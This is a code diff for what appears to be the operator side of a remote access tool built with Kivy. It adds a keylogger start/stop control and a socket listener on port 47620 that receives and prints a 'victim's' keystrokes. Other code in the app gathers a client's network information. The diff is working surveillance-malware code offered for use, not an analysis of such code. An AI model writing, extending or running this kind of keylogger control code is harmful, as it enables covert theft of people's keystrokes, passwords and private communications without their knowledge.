@@ -126,8 +126,13 @@ ScreenManager:
                     
                 OneLineListItem:
                     id: keyloggerBtn
-                    text: "Key Logger"
+                    text: "Key Logger Start"
                     on_press: app.KeyloggerInit()
+                
+                OneLineListItem:
+                    id: keyloggerstopBtn
+                    text: "Key Logger Stop"
+                    on_press: app.KeyloggerStop()
         MDTextField:
             id: disruptConsoleField
             max_height: '200dp'
@@ -190,6 +195,8 @@ class Main(MDApp):
             self.root.ids.statusLbl.text = 'A client connected!'
             self.root.current = "mainMenu"
             print('A client has established connection!')
+
+            self.exitKeyLogger = threading.Event()
 
     # Juls shizzle
     # This is to gather the client's information about their network
@@ -590,26 +597,28 @@ class Main(MDApp):
             break
 
     def KeyloggerInit(self):
-        threading.Thread(target=self.Keylogger).start() #figure out how to kill thread
+        kl = threading.Thread(target=self.Keylogger).start() #figure out how to kill thread
+
+    def KeyloggerStop(self):
+        self.exitKeyLogger.set()
 
     def Keylogger(self):
+        self.exitKeyLogger.clear()
         # Connect to keylogger on port 47620
         print("Waiting for victim to transmit keylog info.")
         klserver = socket.socket()
         klserver.bind((HOST, 47620))
         klserver.listen()
+        conn, addr = klserver.accept()
+        print(f"Connection from {addr} established!")
         while True:
-            conn, addr = klserver.accept()
-            print(f"Connection from {addr} established!")
-            while True:
+            if not self.exitKeyLogger.isSet():
                 keys = conn.recv(1024).decode()
-                if keys == "Key.ctrl_r":
-                    break  # instead of waiting for RCtrl, wanna use kivy toggle to break (terminate thread)
-                else:
-                    print(keys)
-            print("Connection closed.")
-            conn.close()
-            break
+                print(keys)
+            else:
+                break
+        conn.close()
+        print("Connection Closed.")
 
 
 
